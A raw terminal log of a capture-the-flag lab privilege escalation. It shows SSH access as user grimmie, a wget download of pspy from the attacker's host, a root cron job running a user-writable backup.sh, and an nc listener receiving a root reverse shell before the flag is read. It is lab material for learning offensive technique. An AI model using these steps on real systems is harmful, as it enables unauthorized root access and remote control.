┌──(root㉿kali)-[~]
└─# ssh grimmie@192.168.1.6                                    
The authenticity of host '192.168.1.6 (192.168.1.6)' can't be established.
ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.6' (ED25519) to the list of known hosts.
grimmie@192.168.1.6's password: 
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
grimmie@academy:~$ cd /home/grimmie/
grimmie@academy:~$ ls
backup.sh
grimmie@academy:~$ cat backup.sh 
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
grimmie@academy:~$ systemctl list-timers
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Mon 2023-10-02 01:39:00 EDT  9min left     Mon 2023-10-02 01:13:21 EDT  15min ago phpsessionclean.timer        phpsessio
Mon 2023-10-02 06:55:43 EDT  5h 26min left Mon 2023-10-02 01:13:21 EDT  15min ago apt-daily-upgrade.timer      apt-daily
Mon 2023-10-02 12:56:36 EDT  11h left      Mon 2023-10-02 01:13:21 EDT  15min ago apt-daily.timer              apt-daily
Tue 2023-10-03 00:00:00 EDT  22h left      Mon 2023-10-02 01:13:21 EDT  15min ago logrotate.timer              logrotate
Tue 2023-10-03 00:00:00 EDT  22h left      Mon 2023-10-02 01:13:21 EDT  15min ago man-db.timer                 man-db.se
Tue 2023-10-03 01:28:38 EDT  23h left      Mon 2023-10-02 01:28:38 EDT  39s ago   systemd-tmpfiles-clean.timer systemd-t

6 timers listed.
Pass --all to see loaded but inactive timers, too.
grimmie@academy:~$ 
::1              academy.tcm.sec  ff02::2          ip6-allrouters   ip6-loopback     
academy          ff02::1          ip6-allnodes     ip6-localhost    localhost        
grimmie@academy:~$ cd /tmp/
grimmie@academy:/tmp$ ls
backup.zip
systemd-private-9013db5eea0e4e64b709a2c6b8dd6b0d-apache2.service-QW7apG
systemd-private-9013db5eea0e4e64b709a2c6b8dd6b0d-systemd-timesyncd.service-Rwcimt
grimmie@academy:/tmp$ wget http://192.168.1.5/pspy64
--2023-10-02 01:33:22--  http://192.168.1.5/pspy64
Connecting to 192.168.1.5:80... connected.
HTTP request sent, awaiting response... 404 File not found
2023-10-02 01:33:22 ERROR 404: File not found.

grimmie@academy:/tmp$ wget http://192.168.1.5/Vulnerable_Machines/Academy/pspy64
--2023-10-02 01:33:59--  http://192.168.1.5/Vulnerable_Machines/Academy/pspy64
Connecting to 192.168.1.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                        100%[=================================================>]   2.96M  --.-KB/s    in 0.08s   

2023-10-02 01:34:00 (34.9 MB/s) - ‘pspy64’ saved [3104768/3104768]

grimmie@academy:/tmp$ chmod +x pspy
chmod: cannot access 'pspy': No such file or directory
grimmie@academy:/tmp$ chmod +x pspy64
grimmie@academy:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/10/02 01:34:34 CMD: UID=1000  PID=951    | ./pspy64 
2023/10/02 01:34:34 CMD: UID=0     PID=949    | 
2023/10/02 01:34:34 CMD: UID=0     PID=930    | 
2023/10/02 01:34:34 CMD: UID=0     PID=894    | 
2023/10/02 01:34:34 CMD: UID=1000  PID=861    | -bash 
2023/10/02 01:34:34 CMD: UID=1000  PID=860    | sshd: grimmie@pts/0  
2023/10/02 01:34:34 CMD: UID=1000  PID=852    | (sd-pam) 
2023/10/02 01:34:34 CMD: UID=1000  PID=851    | /lib/systemd/systemd --user 
2023/10/02 01:34:34 CMD: UID=0     PID=848    | sshd: grimmie [priv] 
2023/10/02 01:34:34 CMD: UID=33    PID=833    | /bin/sh -i 
2023/10/02 01:34:34 CMD: UID=33    PID=829    | sh -c uname -a; w; id; /bin/sh -i 
2023/10/02 01:34:34 CMD: UID=33    PID=828    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=827    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=826    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=0     PID=817    | 
2023/10/02 01:34:34 CMD: UID=33    PID=717    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=716    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=715    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=714    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=33    PID=713    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=106   PID=511    | /usr/sbin/mysqld 
2023/10/02 01:34:34 CMD: UID=0     PID=444    | /usr/sbin/apache2 -k start 
2023/10/02 01:34:34 CMD: UID=0     PID=368    | /usr/sbin/sshd -D 
2023/10/02 01:34:34 CMD: UID=0     PID=342    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/10/02 01:34:34 CMD: UID=0     PID=339    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                               
2023/10/02 01:34:34 CMD: UID=0     PID=329    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2023/10/02 01:34:34 CMD: UID=0     PID=327    | /usr/sbin/rsyslogd -n -iNONE 
2023/10/02 01:34:34 CMD: UID=0     PID=319    | /usr/sbin/cron -f 
2023/10/02 01:34:34 CMD: UID=0     PID=316    | /lib/systemd/systemd-logind 
2023/10/02 01:34:34 CMD: UID=104   PID=315    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                        
2023/10/02 01:34:34 CMD: UID=0     PID=311    | 
2023/10/02 01:34:34 CMD: UID=0     PID=310    | 
2023/10/02 01:34:34 CMD: UID=101   PID=257    | /lib/systemd/systemd-timesyncd 
2023/10/02 01:34:34 CMD: UID=0     PID=239    | /lib/systemd/systemd-udevd 
2023/10/02 01:34:34 CMD: UID=0     PID=219    | /lib/systemd/systemd-journald 
2023/10/02 01:34:34 CMD: UID=0     PID=187    | 
2023/10/02 01:34:34 CMD: UID=0     PID=186    | 
2023/10/02 01:34:34 CMD: UID=0     PID=184    | 
2023/10/02 01:34:34 CMD: UID=0     PID=153    | 
2023/10/02 01:34:34 CMD: UID=0     PID=118    | 
2023/10/02 01:34:34 CMD: UID=0     PID=115    | 
2023/10/02 01:34:34 CMD: UID=0     PID=113    | 
2023/10/02 01:34:34 CMD: UID=0     PID=112    | 
2023/10/02 01:34:34 CMD: UID=0     PID=111    | 
2023/10/02 01:34:34 CMD: UID=0     PID=109    | 
2023/10/02 01:34:34 CMD: UID=0     PID=108    | 
2023/10/02 01:34:34 CMD: UID=0     PID=98     | 
2023/10/02 01:34:34 CMD: UID=0     PID=59     | 
2023/10/02 01:34:34 CMD: UID=0     PID=50     | 
2023/10/02 01:34:34 CMD: UID=0     PID=49     | 
2023/10/02 01:34:34 CMD: UID=0     PID=48     | 
2023/10/02 01:34:34 CMD: UID=0     PID=30     | 
2023/10/02 01:34:34 CMD: UID=0     PID=29     | 
2023/10/02 01:34:34 CMD: UID=0     PID=28     | 
2023/10/02 01:34:34 CMD: UID=0     PID=27     | 
2023/10/02 01:34:34 CMD: UID=0     PID=26     | 
2023/10/02 01:34:34 CMD: UID=0     PID=25     | 
2023/10/02 01:34:34 CMD: UID=0     PID=24     | 
2023/10/02 01:34:34 CMD: UID=0     PID=23     | 
2023/10/02 01:34:34 CMD: UID=0     PID=22     | 
2023/10/02 01:34:34 CMD: UID=0     PID=21     | 
2023/10/02 01:34:34 CMD: UID=0     PID=20     | 
2023/10/02 01:34:34 CMD: UID=0     PID=19     | 
2023/10/02 01:34:34 CMD: UID=0     PID=18     | 
2023/10/02 01:34:34 CMD: UID=0     PID=17     | 
2023/10/02 01:34:34 CMD: UID=0     PID=16     | 
2023/10/02 01:34:34 CMD: UID=0     PID=15     | 
2023/10/02 01:34:34 CMD: UID=0     PID=14     | 
2023/10/02 01:34:34 CMD: UID=0     PID=12     | 
2023/10/02 01:34:34 CMD: UID=0     PID=11     | 
2023/10/02 01:34:34 CMD: UID=0     PID=10     | 
2023/10/02 01:34:34 CMD: UID=0     PID=9      | 
2023/10/02 01:34:34 CMD: UID=0     PID=8      | 
2023/10/02 01:34:34 CMD: UID=0     PID=6      | 
2023/10/02 01:34:34 CMD: UID=0     PID=4      | 
2023/10/02 01:34:34 CMD: UID=0     PID=3      | 
2023/10/02 01:34:34 CMD: UID=0     PID=2      | 
2023/10/02 01:34:34 CMD: UID=0     PID=1      | /sbin/init 
2023/10/02 01:35:01 CMD: UID=0     PID=958    | /usr/sbin/CRON -f 
2023/10/02 01:35:01 CMD: UID=0     PID=959    | /usr/sbin/CRON -f 
2023/10/02 01:35:01 CMD: UID=0     PID=960    | /bin/sh -c /home/grimmie/backup.sh 
2023/10/02 01:35:01 CMD: UID=0     PID=961    | /bin/bash /home/grimmie/backup.sh 
2023/10/02 01:35:01 CMD: UID=0     PID=962    | /bin/bash /home/grimmie/backup.sh 
2023/10/02 01:35:01 CMD: UID=0     PID=963    | /bin/bash /home/grimmie/backup.sh 




<----- Reverse Shell on Grimmie ---->

┌──(root㉿kali)-[~]
└─# nc -nvlp 69
listening on [any] 69 ...
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.6] 52160
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
root@academy:~# 
